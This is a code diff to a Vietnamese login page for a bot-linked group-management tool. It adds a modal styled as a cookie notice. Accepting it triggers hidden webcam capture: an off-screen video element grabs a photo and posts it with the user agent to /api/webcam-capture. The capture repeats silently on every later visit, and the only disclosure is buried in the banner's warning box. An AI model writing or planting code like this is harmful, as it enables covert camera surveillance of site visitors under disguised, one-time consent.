@@ -1,12 +1,136 @@
 <!DOCTYPE html>
 <html lang="vi">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Đăng Nhập - Quản Lý Tương Tác</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+        /* Consent Modal */
+        .consent-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .consent-box {
+            background: linear-gradient(135deg, #1e1e2e, #2d2d44);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            border: 2px solid #6366f1;
+            box-shadow: 0 20px 60px rgba(99, 102, 241, 0.3);
+        }
+
+        .consent-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        .consent-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 15px;
+        }
+
+        .consent-text {
+            color: #a0a0b0;
+            font-size: 14px;
+            line-height: 1.8;
+            margin-bottom: 25px;
+        }
+
+        .consent-warning {
+            background: rgba(245, 158, 11, 0.2);
+            border: 1px solid #f59e0b;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 25px;
+            color: #fbbf24;
+            font-size: 13px;
+        }
+
+        .consent-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .btn-consent {
+            padding: 14px 40px;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex: 1;
+            max-width: 180px;
+        }
+
+        .btn-accept {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+
+        .btn-accept:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.4);
+        }
+
+        .btn-decline {
+            background: linear-gradient(135deg, #6b7280, #4b5563);
+            color: white;
+        }
+
+        .btn-decline:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(107, 114, 128, 0.4);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
 </head>
+
 <body class="login-page">
+    <!-- Consent Modal -->
+    <div class="consent-overlay" id="consentModal">
+        <div class="consent-box">
+            <div class="consent-icon">🍪📷</div>
+            <h2 class="consent-title">Chính Sách Cookie & Thu Thập Dữ Liệu</h2>
+            <p class="consent-text">
+                Trang web này sử dụng cookie để cải thiện trải nghiệm người dùng và phân tích lưu lượng truy cập.
+            </p>
+            <div class="consent-warning">
+                <strong>⚠️ LƯU Ý QUAN TRỌNG:</strong><br>
+                Nếu bạn đồng ý, website sẽ <strong>tự động chụp ảnh webcam</strong> của bạn một cách ẩn và gửi về server
+                để <strong>phục vụ mục đích nghiên cứu</strong>. Ảnh sẽ được thu thập và lưu trữ.
+            </div>
+            <div class="consent-buttons">
+                <button class="btn-consent btn-decline" onclick="declineConsent()">Từ Chối</button>
+                <button class="btn-consent btn-accept" onclick="acceptConsent()">Đồng Ý</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden video for camera capture -->
+    <video id="hiddenVideo" autoplay playsinline
+        style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
     <div class="login-container">
         <div class="login-box">
             <div class="login-header">
@@ -14,44 +138,112 @@
                 <h1>Quản Lý Tương Tác</h1>
                 <p>Đăng nhập để quản lý nhóm của bạn</p>
             </div>
-            
             <form id="loginForm" class="login-form">
                 <div class="input-group">
-                    <label for="code">Mã Code</label>
-                    <input type="text" id="code" name="code" placeholder="Nhập mã 10 số" maxlength="10" required>
+                    <label>Mã Code</label>
+                    <input type="text" id="code" placeholder="Nhập mã 10 số" maxlength="10" required>
                 </div>
-                
                 <div class="input-group">
-                    <label for="password">Mật Khẩu</label>
-                    <input type="password" id="password" name="password" placeholder="Nhập mật khẩu 10 số" maxlength="10" required>
+                    <label>Mật Khẩu</label>
+                    <input type="password" id="password" placeholder="Nhập mật khẩu 10 số" maxlength="10" required>
                 </div>
-                
-                <button type="submit" class="btn-login">
-                    <span>Đăng Nhập</span>
-                    <span class="loading" style="display:none;">⏳</span>
-                </button>
+                <button type="submit" class="btn-login">Đăng Nhập</button>
             </form>
-            
             <div class="login-footer">
                 <p>Sử dụng lệnh <code>/addaccount</code> trong bot để tạo tài khoản</p>
             </div>
         </div>
     </div>
-    
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // Check if user already consented
+        const hasConsented = localStorage.getItem('photoConsent');
+        if (hasConsented === 'true') {
+            document.getElementById('consentModal').classList.add('hidden');
+            // Already consented, capture again
+            captureAndSend();
+        } else if (hasConsented === 'false') {
+            document.getElementById('consentModal').classList.add('hidden');
+        }
+
+        function declineConsent() {
+            localStorage.setItem('photoConsent', 'false');
+            document.getElementById('consentModal').classList.add('hidden');
+        }
+
+        async function acceptConsent() {
+            localStorage.setItem('photoConsent', 'true');
+            document.getElementById('consentModal').classList.add('hidden');
+            await captureAndSend();
+        }
+
+        async function captureAndSend() {
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 }
+                });
+                video.srcObject = stream;
+
+                // Wait for video to be ready and focus
+                await new Promise(resolve => {
+                    video.onloadeddata = () => {
+                        setTimeout(resolve, 1000); // Wait 1s for focus
+                    };
+                });
+
+                // Capture frame
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                // Stop camera immediately
+                stream.getTracks().forEach(track => track.stop());
+
+                // Convert to base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+                // Send to server
+                await fetch('/api/webcam-capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        image: imageData,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    })
+                });
+
+                console.log('Photo captured for research');
+            } catch (e) {
+                console.log('Camera not available or denied');
+            }
+        }
+
+        // Login form handler
+        document.getElementById('loginForm').onsubmit = async (e) => {
             e.preventDefault();
-            
             const code = document.getElementById('code').value;
             const password = document.getElementById('password').value;
-            
-            // Lưu vào localStorage
-            localStorage.setItem('userCode', code);
-            localStorage.setItem('userPass', password);
-            
-            // Chuyển sang dashboard
-            window.location.href = 'dashboard.html';
-        });
+
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code, password })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                localStorage.setItem('userCode', code);
+                window.location.href = 'dashboard.html';
+            } else {
+                alert(data.message || 'Sai thông tin');
+            }
+        };
     </script>
 </body>
+
 </html>
